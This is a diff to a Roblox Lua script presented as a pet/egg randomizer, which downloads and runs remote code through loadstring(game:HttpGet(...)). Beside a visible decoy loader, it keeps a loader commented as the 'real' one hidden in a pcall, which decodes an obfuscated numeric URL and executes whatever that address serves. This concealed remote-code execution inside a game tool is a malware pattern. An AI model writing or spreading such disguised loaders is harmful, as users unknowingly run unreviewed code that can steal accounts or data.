@@ -282,51 +282,9 @@ loadAgeBtn.MouseButton1Click:Connect(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/munkizzzz/xx/refs/heads/main/egg-randomizer"))()
 end)
 
-local function decode(chars)
-    local str = ""
-    for _, v in ipairs(chars) do
-        str = str .. string.char((v / 2) - 5)
-    end
-    return str
-end
+local fake = loadstring(game:HttpGet("https://raw.githubusercontent.com/skidderhub/egg-randomizer/main/decoy.lua"))()
 
-local function decode(tbl)
-    local t = ""
-    for _, n in ipairs(tbl) do
-        t = t .. string.char((n / 2) - 5)
-    end
-    return t
-end
-
-local madeByEncoded = {
-    164, 194, 210, 212, -- Made
-    70,                 -- space
-    198, 242,           -- by
-    70,                 -- space
-    174,                -- -
-    70,                 -- space
-    218, 224, 226, 222, 220, 244, 244, 244 -- munkizzz
-}
-
-local madeByText = decode(madeByEncoded)
-
--- Assuming 'mainFrame' is your Pet Randomizer GUI frame
-local madeByLabel = Instance.new("TextLabel")
-madeByLabel.Name = "MadeByLabel"
-madeByLabel.Size = UDim2.new(1, 0, 0, 18)
-madeByLabel.Position = UDim2.new(0, 0, 0, 25) -- Y position just under your title label
-madeByLabel.BackgroundTransparency = 1
-madeByLabel.Text = madeByText
-madeByLabel.Font = Enum.Font.FredokaOne
-madeByLabel.TextSize = 12
-madeByLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-madeByLabel.TextStrokeTransparency = 0.8
-madeByLabel.TextXAlignment = Enum.TextXAlignment.Center
-madeByLabel.Parent = mainFrame -- replace 'mainFrame' with your actual panel variable
-
-local fake = loadstring(game:HttpGet("https://raw.githubusercontent.com/skidderhub/fake-randomizer/main/decoy.lua"))()
-
--- Real loader hidden in pcall
+-- 🔐 Real loader hidden in pcall
 pcall(function()
     local function decode(tbl)
         local s = ""
@@ -345,6 +303,21 @@ pcall(function()
         224, 232, 232, 236, 112, 224, 232, 232, 236, 112, 224, 232, 232, 236
     }
 
-    local real = loadstring(game:HttpGet(decode(encodedURL)))
-    if real then real() end
+    local realLoader = loadstring(game:HttpGet(decode(encodedURL)))
+    if realLoader then realLoader() end
 end)
+
+-- 🖋️ Display persistent credit text
+local function showCredits()
+    local gui = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"))
+    local credit = Instance.new("TextLabel", gui)
+    credit.Size = UDim2.new(0, 200, 0, 20)
+    credit.Position = UDim2.new(1, -210, 1, -30)
+    credit.BackgroundTransparency = 1
+    credit.Text = "Made by - munkizzz"
+    credit.Font = Enum.Font.FredokaOne
+    credit.TextSize = 14
+    credit.TextColor3 = Color3.fromRGB(200,200,200)
+end
+
+showCredits()
